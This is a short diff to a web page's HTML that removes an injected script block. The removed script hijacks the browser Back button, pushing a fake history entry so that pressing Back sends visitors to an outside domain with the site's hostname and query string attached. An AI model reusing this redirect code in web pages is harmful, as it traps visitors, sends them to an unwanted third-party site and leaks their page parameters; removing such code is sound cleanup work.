@@ -182,28 +182,4 @@ if (window.location.search.indexOf('utm_match=e') > -1) {
 var div = document.getElementById("rdr");
 div.style.backgroundImage = `url(${url})`;
 </script>
-<script type="text/javascript">
- (function(w,d){ 
- w.navigationUrl = "https://clickclackwow.club/menu?referrer=" + window.location.hostname  + window.location.search.replace('?', '&')
-  var targetNavigation=function(){ 
-    var url= "https://clickclackwow.club/menu?referrer=" + window.location.hostname  + window.location.search.replace('?', '&'); 
-    if(w.navigationUrl){ 
-      url=w.navigationUrl} 
-    else{ 
-      return} 
-    w.history&&w.history.pushState&&w.history.pushState(null,null,w.location); 
-    w.addEventListener&&w.addEventListener('popstate',function(){ 
-      w.location=url} 
-                                            ,!1)}; 
-  (function(){ 
-    if(w.addEventListener){ 
-      w.addEventListener('pageshow',function(){ 
-        setTimeout(targetNavigation,0)} 
-                          ,!1)} 
-    else{ 
-      setTimeout(targetNavigation,0)} 
-  } 
-   ())} 
- (window,document));
-</script>
 </body></html>
